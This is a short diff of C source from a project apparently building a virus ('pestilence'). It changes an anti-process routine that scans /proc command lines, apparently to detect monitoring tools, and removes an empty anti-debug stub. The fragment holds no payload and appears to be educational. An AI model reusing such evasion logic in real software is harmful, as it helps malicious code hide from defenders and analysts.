@@ -26,11 +26,12 @@ void    ft_antiprocess(t_pestilence *pestilence)
         {
             if (atoi(pestilence->readproc->d_name) > 0)
             {
-                snprintf(path, sizeof(path), "/proc/%s/comm", pestilence->readproc->d_name);
+                snprintf(path, sizeof(path), "/proc/%s/cmdline", pestilence->readproc->d_name);
                 fd = open(path, O_RDONLY);
                 if (fd == -1)
                     continue;
-                read(fd, buff, sizeof(buff));
+                memset(buff, 0, sizeof(buff));
+                read(fd, buff, sizeof(buff) - 1);
                 close(fd);
                 buff[strcspn(buff, "\n")] = 0;
                 if (!strcmp(ft_getproc(i), buff))
@@ -41,11 +42,6 @@ void    ft_antiprocess(t_pestilence *pestilence)
     }
     closedir(pestilence->proc);
 }
-
-void    ft_antidebug(t_pestilence *pestilence)
-{
-    (void)pestilence;
-} 
 
 void    ft_obfuscation(t_pestilence *pestilence)
 {
